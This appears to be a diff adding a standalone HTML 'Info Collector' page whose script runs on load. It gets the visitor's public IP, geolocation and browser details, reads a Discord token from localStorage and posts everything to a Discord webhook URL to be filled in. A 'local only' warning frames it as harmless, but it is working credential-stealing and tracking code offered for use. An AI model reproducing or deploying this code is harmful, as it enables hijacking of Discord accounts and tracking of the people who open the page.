@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Info Collector (Local Only)</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      background: #161b22;
+      border-radius: 12px;
+      padding: 40px;
+      max-width: 600px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+    h1 {
+      color: #58a6ff;
+      margin-bottom: 20px;
+    }
+    .status {
+      font-size: 1.2rem;
+      margin: 20px 0;
+    }
+    .success { color: #3fb950; }
+    .error   { color: #f85149; }
+    .warning {
+      background: #442111;
+      color: #ff9e9e;
+      padding: 15px;
+      border-radius: 8px;
+      margin: 20px 0;
+    }
+    .instructions {
+      font-size: 0.95rem;
+      color: #8b949e;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Local Info Collector</h1>
+    <div class="warning">
+      ⚠️ This page will automatically send your IP, browser info, Discord token (if detected), and location to your webhook.<br>
+      <strong>Only open this file locally on your machine.</strong>
+    </div>
+    <div id="status" class="status">Collecting and sending info...</div>
+
+    <div class="instructions">
+      <p><strong>Setup:</strong></p>
+      <ol style="text-align:left; max-width:500px; margin:0 auto;">
+        <li>Replace <code>YOUR_WEBHOOK_URL_HERE</code> in the script with your Discord webhook URL</li>
+        <li>Save and open this file locally (double-click)</li>
+        <li>Info will be sent silently to your webhook</li>
+      </ol>
+    </div>
+  </div>
+
+  <script>
+    // === CHANGE THIS TO YOUR OWN WEBHOOK URL ===
+    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // e.g. https://discord.com/api/webhooks/1234567890/abcDEF...
+
+    async function collectAndSend() {
+      const status = document.getElementById('status');
+
+      try {
+        // 1. Get public IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipRes.json();
+
+        // 2. Get detailed IP info
+        const infoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await infoRes.json();
+
+        // 3. Browser info
+        const browserInfo = (() => {
+          const ua = navigator.userAgent;
+          let name = 'Unknown', version = '';
+          if (ua.includes('Firefox')) { name = 'Firefox'; version = ua.match(/Firefox\/([\d.]+)/)?.[1] || ''; }
+          else if (ua.includes('Edg/') || ua.includes('Edge/')) { name = 'Edge'; version = ua.match(/Edg\/([\d.]+)/)?.[1] || ''; }
+          else if (ua.includes('Chrome')) { name = 'Chrome'; version = ua.match(/Chrome\/([\d.]+)/)?.[1] || ''; }
+          else if (ua.includes('Safari') && !ua.includes('Chrome')) { name = 'Safari'; version = ua.match(/Version\/([\d.]+)/)?.[1] || ''; }
+          else if (ua.includes('Opera') || ua.includes('OPR')) { name = 'Opera'; version = ua.match(/(?:Opera|OPR)\/([\d.]+)/)?.[1] || ''; }
+          return `${name} ${version}`.trim();
+        })();
+
+        // 4. Discord token (from localStorage)
+        let discordToken = localStorage.getItem('token');
+        if (discordToken) discordToken = discordToken.replace(/"/g, '');
+        else discordToken = 'Not detected';
+
+        // 5. Build payload
+        const payload = {
+          timestamp: new Date().toISOString(),
+          ip: ip,
+          geo: {
+            isp: geoData.org || '—',
+            org: geoData.org || '—',
+            hostname: geoData.hostname || '—',
+            country: `${geoData.country_name} (${geoData.country_code})`,
+            region: geoData.region || '—',
+            city: geoData.city || '—',
+            postal: geoData.postal || '—',
+            timezone: geoData.timezone || '—',
+            lat: geoData.latitude?.toFixed(6) || '—',
+            lon: geoData.longitude?.toFixed(6) || '—'
+          },
+          browser: {
+            type: browserInfo,
+            userAgent: navigator.userAgent,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language
+          },
+          discordToken: discordToken,
+          pageUrl: window.location.href
+        };
+
+        // 6. Send to your webhook
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: '**New info collected**',
+            embeds: [{
+              title: 'Device & Network Info',
+              color: 0x5865F2,
+              fields: [
+                { name: 'IP', value: ip, inline: true },
+                { name: 'Location', value: `${geoData.city || '—'}, ${geoData.region || '—'}, ${geoData.country_name || '—'}`, inline: true },
+                { name: 'Lat/Lon', value: `${geoData.latitude?.toFixed(4) || '—'}, ${geoData.longitude?.toFixed(4) || '—'}`, inline: true },
+                { name: 'ISP/Org', value: geoData.org || '—', inline: true },
+                { name: 'Browser', value: browserInfo, inline: true },
+                { name: 'Discord Token', value: `\`\`\`${discordToken}\`\`\``, inline: false }
+              ],
+              footer: { text: `Collected: ${new Date().toLocaleString()}` }
+            }]
+          })
+        });
+
+        if (!response.ok) throw new Error(`Webhook failed: ${response.status}`);
+
+        status.className = 'status success';
+        status.textContent = 'Information successfully sent to your webhook!';
+      } catch (err) {
+        status.className = 'status error';
+        status.textContent = `Error: ${err.message}`;
+        console.error(err);
+      }
+    }
+
+    // Run automatically when page loads
+    window.addEventListener('load', collectAndSend);
+  </script>
+</body>
+</html>
